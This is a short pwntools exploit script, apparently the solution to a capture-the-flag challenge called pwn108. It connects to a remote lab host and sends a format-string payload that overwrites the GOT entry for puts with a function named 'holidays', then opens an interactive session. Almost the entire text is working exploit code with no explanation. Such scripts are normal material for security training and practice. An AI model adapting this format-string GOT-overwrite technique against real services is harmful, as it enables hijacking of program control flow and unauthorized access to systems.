from pwn import *

elf = context.binary = ELF('./pwn108-1644300489260.pwn108', checksec=False)
context.log_level = 'debug'

io = remote('10.10.214.74', 9008)

io.sendlineafter(b'=[Your name]: ', '1')



# Buffer start at 10th

payload = fmtstr_payload(10, {elf.got['puts'] : elf.sym['holidays']})
io.sendlineafter(b'=[Your Reg No]: ', payload)

io.clean()

io.interactive()